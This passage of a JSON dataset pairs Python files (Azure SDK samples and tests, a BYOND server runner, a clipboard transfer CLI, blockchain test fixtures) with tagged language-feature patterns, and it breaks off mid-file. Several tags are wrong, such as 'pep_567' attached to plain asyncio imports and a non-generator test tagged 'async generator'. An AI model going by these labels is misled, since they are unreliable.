            "file": "import os\nimport asyncio\nclass ManageCustomModelsSampleAsync(object):\n    async def manage_custom_models(self):\n        from azure.core.credentials import AzureKeyCredential\n        from azure.core.exceptions import ResourceNotFoundError\n        from azure.ai.formrecognizer.aio import FormTrainingClient\n        endpoint = os.environ[\"AZURE_FORM_RECOGNIZER_ENDPOINT\"]\n        key = os.environ[\"AZURE_FORM_RECOGNIZER_KEY\"]\n        async with FormTrainingClient(\n            endpoint=endpoint, credential=AzureKeyCredential(key)\n        ) as form_training_client:\n            account_properties = await form_training_client.get_account_properties()\n            print(\"Our account has {} custom models, and we can have at most {} custom models\".format(\n                account_properties.custom_model_count, account_properties.custom_model_limit\n            ))\n            custom_models = form_training_client.list_custom_models()\n            print(\"We have models with the following ids:\")\n            first_model = None\n            async for model in custom_models:\n                print(model.model_id)\n                if not first_model:\n                    first_model = model\n            custom_model = await form_training_client.get_custom_model(model_id=first_model.model_id)\n            print(\"Model ID: {}\".format(custom_model.model_id))\n            print(\"Status: {}\".format(custom_model.status))\n            print(\"Requested on: {}\".format(custom_model.requested_on))\n            print(\"Completed on: {}\".format(custom_model.completed_on))\n            await form_training_client.delete_model(model_id=custom_model.model_id)\n            try:\n                await form_training_client.get_custom_model(model_id=custom_model.model_id)\n            except ResourceNotFoundError:\n                print(\"Successfully deleted model with id {}\".format(custom_model.model_id))\nasync def main():\n    sample = ManageCustomModelsSampleAsync()\n    await sample.manage_custom_models()\nif __name__ == '__main__':\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        20,
                        23,
                        "async for",
                        "async for model in custom_models:\n                print(model.model_id)\n                if not first_model:\n                    first_model = model"
                    ]
                ],
                "pep_498v": [
                    [
                        14,
                        16,
                        ".format()"
                    ],
                    [
                        25,
                        25,
                        ".format()"
                    ],
                    [
                        26,
                        26,
                        ".format()"
                    ],
                    [
                        27,
                        27,
                        ".format()"
                    ],
                    [
                        28,
                        28,
                        ".format()"
                    ],
                    [
                        33,
                        33,
                        ".format()"
                    ]
                ]
            }
        },
        "104": {
            "file": "import asyncio\nfrom asyncio import subprocess\nimport os.path as osp\nimport os\nfrom types import *\nBUILDING = 0xA\nSTARTING = 0xA\nis_win = 0 if os.name == \"posix\" else 1\nDREAMMAKER = f'\"{osp.join(os.environ[\"BYOND_BIN\"], \"dm.exe\")}\"' if is_win else \"DreamMaker\"\nDREAMDAEMON = f'\"{osp.join(os.environ[\"BYOND_BIN\"], \"dreamdaemon.exe\")}\"' if is_win else \"DreamDaemon\"\ndef dict_to_params(val: dict, l: LambdaType = lambda x: ...) -> str:\n    s = \"\"\n    if not val or not len(val):\n        return s\n    for key in val:\n        if l(key):\n            s += f\"-{key} {val[key]} \"\n    return s\nclass BYOND:\n    def __init__(self, dme_path):\n        self.path: str = dme_path\n        self.proc: subprocess.Process = None\n    async def build(self):\n        yield {\"output\": None, \"return_code\": BUILDING}\n        proc = await subprocess.create_subprocess_shell(f'{DREAMMAKER} {self.path} -max_errors 10',\n                                                        stdout=subprocess.PIPE)\n        stdout, stderr = await proc.communicate()  \n        yield {\"output\": stdout, \"return_code\": proc.returncode}\n    async def start(self, parameters: dict = None):\n        yield {\"output\": None, \"return_code\": STARTING}\n        build_f = osp.join(osp.dirname(self.path), f\"{osp.basename(self.path)[:-4]}.dmb\")\n        if osp.isfile(build_f):\n            self.proc = await subprocess.create_subprocess_shell(\n                f'{DREAMDAEMON} {build_f} {dict_to_params(parameters)} -logself',\n                stdout=subprocess.PIPE)\n            stdout, stderr = await self.proc.communicate()\n            yield {\"output\": stdout, \"return_code\": self.proc.returncode}  \n            return\n        yield {\"output\": \"No such file or directory\", \"return_code\": 1}\n    async def kill_server(self):\n        yield {\"output\": \"Killing...\"}\n        try:\n            if self.proc and self.proc.pid:\n                self.proc.terminate()\n                del self.proc\n                yield {\"output\": \"Killed successfully\"}\n                return\n        except Exception as e:\n            yield {\"output\": f\"Error: {e.__str__()}\"}",
            "patterns": {
                "pep_526": [
                    [
                        21,
                        "self.path: str = dme_path"
                    ],
                    [
                        22,
                        "self.proc: subprocess.Process = None"
                    ]
                ],
                "pep_567": [
                    [
                        1,
                        1,
                        "import",
                        "import asyncio"
                    ],
                    [
                        2,
                        2,
                        "import",
                        "from asyncio import subprocess"
                    ]
                ],
                "pep_525": [
                    [
                        23,
                        28,
                        "async generator",
                        "async def build(self):\n        yield {\"output\": None, \"return_code\": BUILDING}\n        proc = await subprocess.create_subprocess_shell(f'{DREAMMAKER} {self.path} -max_errors 10',\n                                                        stdout=subprocess.PIPE)\n        stdout, stderr = await proc.communicate()  \n        yield {\"output\": stdout, \"return_code\": proc.returncode}"
                    ],
                    [
                        29,
                        39,
                        "async generator",
                        "async def start(self, parameters: dict = None):\n        yield {\"output\": None, \"return_code\": STARTING}\n        build_f = osp.join(osp.dirname(self.path), f\"{osp.basename(self.path)[:-4]}.dmb\")\n        if osp.isfile(build_f):\n            self.proc = await subprocess.create_subprocess_shell(\n                f'{DREAMDAEMON} {build_f} {dict_to_params(parameters)} -logself',\n                stdout=subprocess.PIPE)\n            stdout, stderr = await self.proc.communicate()\n            yield {\"output\": stdout, \"return_code\": self.proc.returncode}  \n            return\n        yield {\"output\": \"No such file or directory\", \"return_code\": 1}"
                    ],
                    [
                        40,
                        49,
                        "async generator",
                        "async def kill_server(self):\n        yield {\"output\": \"Killing...\"}\n        try:\n            if self.proc and self.proc.pid:\n                self.proc.terminate()\n                del self.proc\n                yield {\"output\": \"Killed successfully\"}\n                return\n        except Exception as e:\n            yield {\"output\": f\"Error: {e.__str__()}\"}"
                    ]
                ],
                "pep_498": [
                    [
                        9,
                        "DREAMMAKER = f'\"{osp.join(os.environ[\"BYOND_BIN\"], \"dm.exe\")}\"' if is_win else \"DreamMaker\""
                    ],
                    [
                        10,
                        "DREAMDAEMON = f'\"{osp.join(os.environ[\"BYOND_BIN\"], \"dreamdaemon.exe\")}\"' if is_win else \"DreamDaemon\""
                    ],
                    [
                        17,
                        "            s += f\"-{key} {val[key]} \""
                    ],
                    [
                        31,
                        "        build_f = osp.join(osp.dirname(self.path), f\"{osp.basename(self.path)[:-4]}.dmb\")"
                    ],
                    [
                        25,
                        "        proc = await subprocess.create_subprocess_shell(f'{DREAMMAKER} {self.path} -max_errors 10',"
                    ],
                    [
                        34,
                        "                f'{DREAMDAEMON} {build_f} {dict_to_params(parameters)} -logself',"
                    ],
                    [
                        49,
                        "            yield {\"output\": f\"Error: {e.__str__()}\"}"
                    ]
                ]
            }
        },
        "105": {
            "file": "from io import BytesIO\nimport click\nimport pyperclip\nimport websockets\nimport asyncio\nimport pathlib\nimport uri as urilib\nimport functools\nimport protocol\nfrom typing import Awaitable, Optional, BinaryIO, Callable, AsyncContextManager\nimport typeguard\nfrom contextlib import asynccontextmanager\nwscp = websockets.WebSocketClientProtocol\nfrom utils import cast_and_check, register_ws_urls, wrap_aiter\nregister_ws_urls(urilib)\n@click.group()\ndef cli():\n    pass\nport_type = click.IntRange(min=1, max=65535)\n@cli.command()\n@click.argument(\"ip\")\n@click.argument(\"port\", type=port_type)\n@click.option(\"--file\", \"-f\", type=click.File(mode=\"rb\"))\n@typeguard.typechecked\ndef send(ip: str, port: int, file: Optional[BinaryIO] = None):\n    if file is not None:\n        @asynccontextmanager\n        async def reader(file: BytesIO):\n            yield (pathlib.Path(file.name).name,\n                   wrap_aiter(iter(functools.partial(file.read, 1024 * 1024 * 8), b'')))\n        sender = protocol.send_file(ip, port, reader(file))\n    else:\n        sender = protocol.send_clipboard(ip, port, pyperclip.paste())\n    asyncio.run(sender)\nclass CLISessionHanlder(protocol.SessionHandler):\n    def __init__(self):\n        self.address: Optional[str] = None\n        self.file_handle: Optional[BinaryIO] = None\n    @property\n    def initialized(self) -> bool:\n        return self.address is not None\n    async def ip_authenticate(self, address: str) -> bool:\n        self.address = address\n        click.echo(f\"Authenticated address {address!r}\")\n        return True\n    async def set_clipboard(self, clipboard: str) -> None:\n        pyperclip.copy(clipboard)\n        click.echo(f\"Clipboard set to {clipboard!r} by {self.address!r}\")\n    def open_file(self, filename: str, estimated_size: Optional[int]) -> \\\n        AsyncContextManager[Callable[[bytes], Awaitable[None]]]:\n        click.echo(f\"Remote {self.address!r} requested to write to file {filename!r}\")\n        @asynccontextmanager\n        async def manager():\n            file = cast_and_check(\n                open(\"./\" + pathlib.Path(filename).name, mode=\"xb\"), BinaryIO)\n            async def write(payload: bytes):\n                assert file.write(payload) == len(payload)\n            try:\n                yield write\n            finally:\n                file.close()\n        return manager()\n    def fatal_error(self) -> None:\n        pass\n    def __del__(self):\n        if self.initialized:\n            click.echo(f\"Session closed for address {self.address}\")\n@cli.command()\n@click.argument(\"network\")\n@click.argument(\"port\", type=port_type)\n@typeguard.typechecked\ndef recieve(network: str, port: int):\n    click.echo(f\"Running server in listen mode ({network!r}, {port})\")\n    asyncio.get_event_loop().run_until_complete(\n        protocol.listen(CLISessionHanlder, network, port))\n    asyncio.get_event_loop().run_forever()\nif __name__ == \"__main__\": cli()",
            "patterns": {
                "pep_526": [
                    [
                        37,
                        "self.address: Optional[str] = None"
                    ],
                    [
                        38,
                        "self.file_handle: Optional[BinaryIO] = None"
                    ]
                ],
                "pep_567": [
                    [
                        5,
                        5,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        28,
                        30,
                        "async generator",
                        "async def reader(file: BytesIO):\n            yield (pathlib.Path(file.name).name,\n                   wrap_aiter(iter(functools.partial(file.read, 1024 * 1024 * 8), b'')))"
                    ],
                    [
                        53,
                        61,
                        "async generator",
                        "async def manager():\n            file = cast_and_check(\n                open(\"./\" + pathlib.Path(filename).name, mode=\"xb\"), BinaryIO)\n            async def write(payload: bytes):\n                assert file.write(payload) == len(payload)\n            try:\n                yield write\n            finally:\n                file.close()"
                    ]
                ],
                "pep_498": [
                    [
                        73,
                        "    click.echo(f\"Running server in listen mode ({network!r}, {port})\")"
                    ],
                    [
                        44,
                        "        click.echo(f\"Authenticated address {address!r}\")"
                    ],
                    [
                        48,
                        "        click.echo(f\"Clipboard set to {clipboard!r} by {self.address!r}\")"
                    ],
                    [
                        51,
                        "        click.echo(f\"Remote {self.address!r} requested to write to file {filename!r}\")"
                    ],
                    [
                        67,
                        "            click.echo(f\"Session closed for address {self.address}\")"
                    ]
                ]
            }
        },
        "106": {
            "file": "import os\nimport asyncio\nimport pytest\nimport time\nfrom azure import eventhub\nfrom azure.eventhub import EventData, Offset, EventHubError, EventHubClientAsync\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_end_of_stream_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset('@latest'))\n    await client.run_async()\n    try:\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Receiving only a single event\"))\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 1\n        assert list(received[-1].body)[0] == b\"Receiving only a single event\"\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_with_offset_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset('@latest'))\n    await client.run_async()\n    try:\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Data\"))\n        time.sleep(1)\n        received = await receiver.receive(timeout=3)\n        assert len(received) == 1\n        offset = received[0].offset\n        offset_receiver = client.add_async_receiver(\"$default\", \"0\", offset=offset)\n        await client.run_async()\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Message after offset\"))\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_with_inclusive_offset_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset('@latest'))\n    await client.run_async()\n    try:\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Data\"))\n        time.sleep(1)\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 1\n        offset = received[0].offset\n        offset_receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset(offset.value, inclusive=True))\n        await client.run_async()\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_with_datetime_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset('@latest'))\n    await client.run_async()\n    try:\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Data\"))\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 1\n        offset = received[0].enqueued_time\n        offset_receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset(offset))\n        await client.run_async()\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Message after timestamp\"))\n        time.sleep(1)\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_with_sequence_no_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset('@latest'))\n    await client.run_async()\n    try:\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Data\"))\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 1\n        offset = received[0].sequence_number\n        offset_receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset(offset))\n        await client.run_async()\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Message next in sequence\"))\n        time.sleep(1)\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_with_inclusive_sequence_no_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset('@latest'))\n    await client.run_async()\n    try:\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        senders[0].send(EventData(b\"Data\"))\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 1\n        offset = received[0].sequence_number\n        offset_receiver = client.add_async_receiver(\"$default\", \"0\", offset=Offset(offset, inclusive=True))\n        await client.run_async()\n        received = await offset_receiver.receive(timeout=5)\n        assert len(received) == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_batch_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", prefetch=500, offset=Offset('@latest'))\n    await client.run_async()\n    try:\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        for i in range(10):\n            senders[0].send(EventData(b\"Data\"))\n        received = await receiver.receive(max_batch_size=5, timeout=5)\n        assert len(received) == 5\n    except:\n        raise\n    finally:\n        await client.stop_async()\nasync def pump(receiver, sleep=None):\n    messages = 0\n    count = 0\n    if sleep:\n        await asyncio.sleep(sleep)\n    batch = await receiver.receive(timeout=10)\n    while batch:\n        count += 1\n        if count >= 10:\n            break\n        messages += len(batch)\n        batch = await receiver.receive(timeout=10)\n    return messages\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_epoch_receiver_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    senders[0].send(EventData(b\"Receiving only a single event\"))\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receivers = []\n    for epoch in [10, 20]:\n        receivers.append(client.add_async_epoch_receiver(\"$default\", \"0\", epoch, prefetch=5))\n    try:\n        await client.run_async()\n        outputs = await asyncio.gather(\n            pump(receivers[0]),\n            pump(receivers[1]),\n            return_exceptions=True)\n        assert isinstance(outputs[0], EventHubError)\n        assert outputs[1] == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_multiple_receiver_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    senders[0].send(EventData(b\"Receiving only a single event\"))\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=True)\n    partitions = await client.get_eventhub_info_async()\n    assert partitions[\"partition_ids\"] == [\"0\", \"1\"]\n    receivers = []\n    for i in range(2):\n        receivers.append(client.add_async_receiver(\"$default\", \"0\", prefetch=10))\n    try:\n        await client.run_async()\n        more_partitions = await client.get_eventhub_info_async()\n        assert more_partitions[\"partition_ids\"] == [\"0\", \"1\"]\n        outputs = await asyncio.gather(\n            pump(receivers[0]),\n            pump(receivers[1]),\n            return_exceptions=True)\n        assert isinstance(outputs[0], int) and outputs[0] == 1\n        assert isinstance(outputs[1], int) and outputs[1] == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_epoch_receiver_after_non_epoch_receiver_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    senders[0].send(EventData(b\"Receiving only a single event\"))\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receivers = []\n    receivers.append(client.add_async_receiver(\"$default\", \"0\", prefetch=10))\n    receivers.append(client.add_async_epoch_receiver(\"$default\", \"0\", 15, prefetch=10))\n    try:\n        await client.run_async()\n        outputs = await asyncio.gather(\n            pump(receivers[0]),\n            pump(receivers[1], sleep=5),\n            return_exceptions=True)\n        assert isinstance(outputs[0], EventHubError)\n        assert isinstance(outputs[1], int) and outputs[1] == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_non_epoch_receiver_after_epoch_receiver_async(connstr_senders):\n    connection_str, senders = connstr_senders\n    senders[0].send(EventData(b\"Receiving only a single event\"))\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receivers = []\n    receivers.append(client.add_async_epoch_receiver(\"$default\", \"0\", 15, prefetch=10))\n    receivers.append(client.add_async_receiver(\"$default\", \"0\", prefetch=10))\n    try:\n        await client.run_async()\n        outputs = await asyncio.gather(\n            pump(receivers[0]),\n            pump(receivers[1]),\n            return_exceptions=True)\n        assert isinstance(outputs[1], EventHubError)\n        assert isinstance(outputs[0], int) and outputs[0] == 1\n    except:\n        raise\n    finally:\n        await client.stop_async()\n@pytest.mark.liveTest\n@pytest.mark.asyncio\nasync def test_receive_batch_with_app_prop_async(connstr_senders):\n    pytest.skip(\"Waiting on uAMQP release\")\n    connection_str, senders = connstr_senders\n    def batched():\n        for i in range(10):\n            yield \"Event Data {}\".format(i)\n        for i in range(10, 20):\n            yield EventData(\"Event Data {}\".format(i))\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", prefetch=500, offset=Offset('@latest'))\n    try:\n        await client.run_async()\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        app_prop_key = \"raw_prop\"\n        app_prop_value = \"raw_value\"\n        batch_app_prop = {app_prop_key:app_prop_value}\n        batch_event = EventData(batch=batched())\n        batch_event.application_properties = batch_app_prop\n        senders[0].send(batch_event)\n        await asyncio.sleep(1)\n        received = await receiver.receive(max_batch_size=15, timeout=5)\n        assert len(received) == 15\n        for index, message in enumerate(received):\n            assert list(message.body)[0] == \"Event Data {}\".format(index).encode('utf-8')\n            assert (app_prop_key.encode('utf-8') in message.application_properties) \\\n                and (dict(message.application_properties)[app_prop_key.encode('utf-8')] == app_prop_value.encode('utf-8'))\n    except:\n        raise\n    finally:\n        await client.stop_async()",
            "patterns": {
                "pep_567": [
                    [
                        2,
                        2,
                        "import",
                        "import asyncio"
                    ]
                ],
                "pep_525": [
                    [
                        269,
                        299,
                        "async generator",
                        "async def test_receive_batch_with_app_prop_async(connstr_senders):\n    pytest.skip(\"Waiting on uAMQP release\")\n    connection_str, senders = connstr_senders\n    def batched():\n        for i in range(10):\n            yield \"Event Data {}\".format(i)\n        for i in range(10, 20):\n            yield EventData(\"Event Data {}\".format(i))\n    client = EventHubClientAsync.from_connection_string(connection_str, debug=False)\n    receiver = client.add_async_receiver(\"$default\", \"0\", prefetch=500, offset=Offset('@latest'))\n    try:\n        await client.run_async()\n        received = await receiver.receive(timeout=5)\n        assert len(received) == 0\n        app_prop_key = \"raw_prop\"\n        app_prop_value = \"raw_value\"\n        batch_app_prop = {app_prop_key:app_prop_value}\n        batch_event = EventData(batch=batched())\n        batch_event.application_properties = batch_app_prop\n        senders[0].send(batch_event)\n        await asyncio.sleep(1)\n        received = await receiver.receive(max_batch_size=15, timeout=5)\n        assert len(received) == 15\n        for index, message in enumerate(received):\n            assert list(message.body)[0] == \"Event Data {}\".format(index).encode('utf-8')\n            assert (app_prop_key.encode('utf-8') in message.application_properties) \\\n                and (dict(message.application_properties)[app_prop_key.encode('utf-8')] == app_prop_value.encode('utf-8'))\n    except:\n        raise\n    finally:\n        await client.stop_async()"
                    ]
                ],
                "pep_498v": [
                    [
                        274,
                        274,
                        ".format()"
                    ],
                    [
                        276,
                        276,
                        ".format()"
                    ],
                    [
                        293,
                        293,
                        ".format()"
                    ]
                ]
            }
        },
        "107": {
            "file": "import asyncio\nimport signal\nfrom secrets import token_bytes\nfrom typing import Dict, List, Optional\nfrom lotus.consensus.constants import ConsensusConstants\nfrom lotus.daemon.server import WebSocketServer, create_server_for_daemon, daemon_launch_lock_path, singleton\nfrom lotus.full_node.full_node_api import FullNodeAPI\nfrom lotus.server.start_farmer import service_kwargs_for_farmer\nfrom lotus.server.start_full_node import service_kwargs_for_full_node\nfrom lotus.server.start_harvester import service_kwargs_for_harvester\nfrom lotus.server.start_introducer import service_kwargs_for_introducer\nfrom lotus.server.start_service import Service\nfrom lotus.server.start_timelord import service_kwargs_for_timelord\nfrom lotus.server.start_wallet import service_kwargs_for_wallet\nfrom lotus.simulator.start_simulator import service_kwargs_for_full_node_simulator\nfrom lotus.timelord.timelord_launcher import kill_processes, spawn_process\nfrom lotus.types.peer_info import PeerInfo\nfrom lotus.util.bech32m import encode_puzzle_hash\nfrom lotus.util.block_tools import BlockTools, test_constants\nfrom lotus.util.hash import std_hash\nfrom lotus.util.ints import uint16, uint32\nfrom lotus.util.keychain import Keychain, bytes_to_mnemonic\nfrom tests.time_out_assert import time_out_assert_custom_interval\nbt = BlockTools(constants=test_constants)\nself_hostname = bt.config[\"self_hostname\"]\ndef constants_for_dic(dic):\n    return test_constants.replace(**dic)\nasync def _teardown_nodes(node_aiters: List) -> None:\n    awaitables = [node_iter.__anext__() for node_iter in node_aiters]\n    for sublist_awaitable in asyncio.as_completed(awaitables):\n        try:\n            await sublist_awaitable\n        except StopAsyncIteration:\n            pass\nasync def setup_daemon(btools):\n    root_path = btools.root_path\n    config = btools.config\n    lockfile = singleton(daemon_launch_lock_path(root_path))\n    crt_path = root_path / config[\"daemon_ssl\"][\"private_crt\"]\n    key_path = root_path / config[\"daemon_ssl\"][\"private_key\"]\n    ca_crt_path = root_path / config[\"private_ssl_ca\"][\"crt\"]\n    ca_key_path = root_path / config[\"private_ssl_ca\"][\"key\"]\n    assert lockfile is not None\n    create_server_for_daemon(btools.root_path)\n    ws_server = WebSocketServer(root_path, ca_crt_path, ca_key_path, crt_path, key_path)\n    await ws_server.start()\n    yield ws_server\n    await ws_server.stop()\nasync def setup_full_node(\n    consensus_constants: ConsensusConstants,\n    db_name,\n    port,\n    local_bt,\n    introducer_port=None,\n    simulator=False,\n    send_uncompact_interval=0,\n    sanitize_weight_proof_only=False,\n    connect_to_daemon=False,\n):\n    db_path = local_bt.root_path / f\"{db_name}\"\n    if db_path.exists():\n        db_path.unlink()\n    config = local_bt.config[\"full_node\"]\n    config[\"database_path\"] = db_name\n    config[\"send_uncompact_interval\"] = send_uncompact_interval\n    config[\"target_uncompact_proofs\"] = 30\n    config[\"peer_connect_interval\"] = 50\n    config[\"sanitize_weight_proof_only\"] = sanitize_weight_proof_only\n    if introducer_port is not None:\n        config[\"introducer_peer\"][\"host\"] = self_hostname\n        config[\"introducer_peer\"][\"port\"] = introducer_port\n    else:\n        config[\"introducer_peer\"] = None\n    config[\"dns_servers\"] = []\n    config[\"port\"] = port\n    config[\"rpc_port\"] = port + 1000\n    overrides = config[\"network_overrides\"][\"constants\"][config[\"selected_network\"]]\n    updated_constants = consensus_constants.replace_str_to_bytes(**overrides)\n    if simulator:\n        kwargs = service_kwargs_for_full_node_simulator(local_bt.root_path, config, local_bt)\n    else:\n        kwargs = service_kwargs_for_full_node(local_bt.root_path, config, updated_constants)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=connect_to_daemon,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api\n    service.stop()\n    await service.wait_closed()\n    if db_path.exists():\n        db_path.unlink()\nasync def setup_wallet_node(\n    port,\n    consensus_constants: ConsensusConstants,\n    local_bt,\n    full_node_port=None,\n    introducer_port=None,\n    key_seed=None,\n    starting_height=None,\n):\n    config = bt.config[\"wallet\"]\n    config[\"port\"] = port\n    config[\"rpc_port\"] = port + 1000\n    if starting_height is not None:\n        config[\"starting_height\"] = starting_height\n    config[\"initial_num_public_keys\"] = 5\n    entropy = token_bytes(32)\n    keychain = Keychain(entropy.hex(), True)\n    if key_seed is None:\n        key_seed = entropy\n    keychain.add_private_key(bytes_to_mnemonic(key_seed), \"\")\n    first_pk = keychain.get_first_public_key()\n    assert first_pk is not None\n    db_path_key_suffix = str(first_pk.get_fingerprint())\n    db_name = f\"test-wallet-db-{port}-KEY.sqlite\"\n    db_path_replaced: str = db_name.replace(\"KEY\", db_path_key_suffix)\n    db_path = bt.root_path / db_path_replaced\n    if db_path.exists():\n        db_path.unlink()\n    config[\"database_path\"] = str(db_name)\n    config[\"testing\"] = True\n    config[\"introducer_peer\"][\"host\"] = self_hostname\n    if introducer_port is not None:\n        config[\"introducer_peer\"][\"port\"] = introducer_port\n        config[\"peer_connect_interval\"] = 10\n    else:\n        config[\"introducer_peer\"] = None\n    if full_node_port is not None:\n        config[\"full_node_peer\"] = {}\n        config[\"full_node_peer\"][\"host\"] = self_hostname\n        config[\"full_node_peer\"][\"port\"] = full_node_port\n    else:\n        del config[\"full_node_peer\"]\n    kwargs = service_kwargs_for_wallet(local_bt.root_path, config, consensus_constants, keychain)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start(new_wallet=True)\n    yield service._node, service._node.server\n    service.stop()\n    await service.wait_closed()\n    if db_path.exists():\n        db_path.unlink()\n    keychain.delete_all_keys()\nasync def setup_harvester(port, farmer_port, consensus_constants: ConsensusConstants, b_tools):\n    kwargs = service_kwargs_for_harvester(b_tools.root_path, b_tools.config[\"harvester\"], consensus_constants)\n    kwargs.update(\n        server_listen_ports=[port],\n        advertised_port=port,\n        connect_peers=[PeerInfo(self_hostname, farmer_port)],\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._node, service._node.server\n    service.stop()\n    await service.wait_closed()\nasync def setup_farmer(\n    port,\n    consensus_constants: ConsensusConstants,\n    b_tools,\n    full_node_port: Optional[uint16] = None,\n):\n    config = bt.config[\"farmer\"]\n    config_pool = bt.config[\"pool\"]\n    config[\"lotus_target_address\"] = encode_puzzle_hash(b_tools.farmer_ph, \"lotus\")\n    config[\"pool_public_keys\"] = [bytes(pk).hex() for pk in b_tools.pool_pubkeys]\n    config[\"port\"] = port\n    config_pool[\"lotus_target_address\"] = encode_puzzle_hash(b_tools.pool_ph, \"lotus\")\n    if full_node_port:\n        config[\"full_node_peer\"][\"host\"] = self_hostname\n        config[\"full_node_peer\"][\"port\"] = full_node_port\n    else:\n        del config[\"full_node_peer\"]\n    kwargs = service_kwargs_for_farmer(b_tools.root_path, config, config_pool, b_tools.keychain, consensus_constants)\n    kwargs.update(\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api, service._node.server\n    service.stop()\n    await service.wait_closed()\nasync def setup_introducer(port):\n    kwargs = service_kwargs_for_introducer(\n        bt.root_path,\n        bt.config[\"introducer\"],\n    )\n    kwargs.update(\n        advertised_port=port,\n        parse_cli_args=False,\n        connect_to_daemon=False,\n    )\n    service = Service(**kwargs)\n    await service.start()\n    yield service._api, service._node.server\n    service.stop()\n    await service.wait_closed()\nasync def setup_vdf_client(port):\n    vdf_task_1 = asyncio.create_task(spawn_process(self_hostname, port, 1))\n    def stop():\n        asyncio.create_task(kill_processes())\n    asyncio.get_running_loop().add_signal_handler(signal.SIGTERM, stop)\n    asyncio.get_running_loop().add_signal_handler(signal.SIGINT, stop)\n    yield vdf_task_1\n    await kill_processes()\nasync def setup_vdf_clients(port):\n    vdf_task_1 = 